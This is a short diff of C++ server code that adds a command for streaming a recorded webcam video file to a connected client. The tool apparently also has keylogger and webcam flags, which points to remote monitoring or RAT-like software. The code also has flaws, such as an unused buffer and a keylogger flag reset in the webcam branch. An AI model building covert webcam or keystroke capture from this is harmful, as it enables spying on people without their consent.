@@ -231,8 +231,26 @@ void ServerSocket::ProcessClientMessage() {
 	else if (query == 27) {
 		if (!isWebcamOn) result = "N";
 		else {
+			fstream file("_Data/Webcam/webcam.avi", ios::binary | ios::in);
+			isKeyloggerOn = false;
+			file.seekg(0, ios::end);
+			size_t fileSize = file.tellg();
+			file.seekg(0, ios::beg);
+			result = "F" + to_string(fileSize);
+			Send();
+			char fileBuffer[maxBufferSize];
+			while (fileSize > 0 && fileSize >= maxBufferSize) {
+				file.read(buffer, maxBufferSize);
+				send(clientSocket, buffer, maxBufferSize, 0);
+				fileSize -= maxBufferSize;
+			}
+			if (fileSize > 0) {
+				file.read(buffer, fileSize);
+				send(clientSocket, buffer, fileSize, 0);
+			}
+			file.close();
+			sent = true;
 			isWebcamOn = false;
-			result = "Y";
 		}
 	}
 	
